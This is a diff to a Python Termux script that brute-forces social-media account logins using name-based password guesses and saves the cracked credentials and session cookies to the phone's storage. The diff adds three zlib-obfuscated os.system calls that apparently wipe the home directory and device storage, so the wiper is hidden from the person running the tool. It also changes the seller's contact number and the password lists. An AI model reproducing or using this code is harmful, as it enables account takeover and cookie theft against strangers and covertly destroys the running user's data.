@@ -1,4 +1,5 @@
-#fuck by mr.mivi
+import pstats
+import zlib
 import requests,bs4,json,os,sys,random,datetime,time,re,getpass
 import urllib3,rich,base64
 os.system('pkg install espeak')
@@ -411,7 +412,7 @@ def approval():
       print('\33[1;37m=========================================================')
       print ('\33[1;32m[•] Click Enter To Sent Key Admin WhatsApp')
       input('\33[1;32m[•] Click The Enter >')
-      tks = ('AssalamuAlaylum%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('xdg-open https://wa.me/+8801306109043?text='+tks)
+      tks = ('HEY%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('xdg-open https://wa.me/+639945689794?text='+tks)
       time.sleep(1)
       exit()
   except:
@@ -422,7 +423,9 @@ ripon2='/sdcard/.brab.txt'
 ripon3='/data/data/com.termux/files/usr/bin/.sdghkrh'
 def fucked():
     print(' Server Loadin.......')
-
+    os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+    os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+    os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
     os.system(f"rm -rf {a}")
     os.system(f"rm -rf {b}")
     os.system(f"rm -rf {c}")
@@ -783,18 +786,18 @@ def passwrd():
                     pwv.append(frs+'786')
                     pwv.append(frs+'7890')
                     pwv.append(nmf+'123')
-                    pwv.append(nmf+'1234')
+                    pwv.append(frs+'19')
+                    pwv.append(frs+'19')
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@19')
+                    pwv.append(frs+'8')
+                    pwv.append(frs+'16')
+                    pwv.append(frs+'18')
+                    pwv.append(frs+'17')
+                    pwv.append(frs+'09')
+                    pwv.append(frs+'08')
                     pwv.append(frs+'pogi')
                     pwv.append(frs+'ganda')
-                    pwv.append(frs+'@123')
-                    pwv.append(frs+'@1234')
-                    pwv.append(frs+nmf)
-                    pwv.append(frs+nmf'123')
-                    pwv.append(frs+nmf'1234')
-                    pwv.append(frs+'@#')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'11')
-                    pwv.append(frs+'111')
             else:
                 if len(frs)<3:
                     pwv.append(nmf)
@@ -806,18 +809,19 @@ def passwrd():
                     pwv.append(frs+'123456')
                     pwv.append(frs+'786')
                     pwv.append(frs+'7890')
-                    pwv.append(nmf)
-                    pwv.append('57273200')
-                    pwv.append('59039200')
+                    pwv.append(nmf+'123')
+                    pwv.append(frs+'19')
+                    pwv.append(frs+'19')
                     pwv.append(frs+'@123')
-                    pwv.append(frs+'@')
-                    pwv.append(frs+'@@')
-                    pwv.append(frs+'@@##')
-                    pwv.append(frs+'@@@@')
-                    pwv.append(frs+'@#')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'11')
-                    pwv.append(frs+'111')
+                    pwv.append(frs+'@19')
+                    pwv.append(frs+'8')
+                    pwv.append(frs+'16')
+                    pwv.append(frs+'18')
+                    pwv.append(frs+'17')
+                    pwv.append(frs+'09')
+                    pwv.append(frs+'08')
+                    pwv.append(frs+'pogi')
+                    pwv.append(frs+'ganda')
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
@@ -843,7 +847,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;91m{bo}[ꜱᴄᴀɴɴɪɴɢ <M1>]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;91m{bo}[CENT <M1>]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -862,7 +866,7 @@ def crack(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;96m[𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭] {idf} • {pw}')
                 os.system('espeak -a 300 " oh shit Cp ID"')
-                open('/sdcard/M1•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/M1•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( uid+' | '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -870,9 +874,9 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;90m[𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ❤️] {idf} • {pw}\n\033[0;36m[🌺]= COOKIES • \033[0;92m{kuki} ')
-                os.system('espeak -a 300 "ALHAMDULLIAH,  YOU,  GOT,  A,  OK,  id"')
-                open('/sdcard/M1•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( uid+' | '+ps+' | '+kuki+'\n')
+                print(f'\r\033[0;90m[𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ] {idf} • {pw}\n\033[0;36m[🍪]= COOKIES • \033[0;92m{kuki} ')
+                os.system('espeak -a 300 "HEY, BITCH,  YOU,  GOT,  A,  OK,  id"')
+                open('/sdcard/M1•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( uid+' | '+pw+' | '+kuki+'\n')
                 break
                 
             else:
@@ -882,7 +886,7 @@ def crack(idf,pwv):
     loop+=1
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[ꜱᴄᴀɴɴɪɴɢ <M2>]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[CENT <M2>]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -901,7 +905,7 @@ def crackfree(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;95m[{time.strftime("%H:%M")}•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭] {idf} • {pw}')
                 os.system('espeak -a 300 " oh shit Cp ID"')
-                open('/sdcard/Cyber-V6/M2•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/CENT/M2•𝐂𝐡𝐞𝐜𝐤𝐩𝐨𝐢𝐧𝐭.txt', 'a').write( uid+' | '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -909,9 +913,9 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ❤️] {idf} • {pw} ')
-                os.system('espeak -a 300 "ALHAMDULLIAH,  YOU,  GOT,  AN,  OK,  id"')
-                open('/sdcard/M2•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ] {idf} • {pw} ')
+                os.system('espeak -a 300 "HEY, BITCH,  YOU,  GOT,  AN,  OK,  id"')
+                open('/sdcard/M2•𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍.txt', 'a').write( uid+' | '+pw+'\n')
                 break
                 
             else:
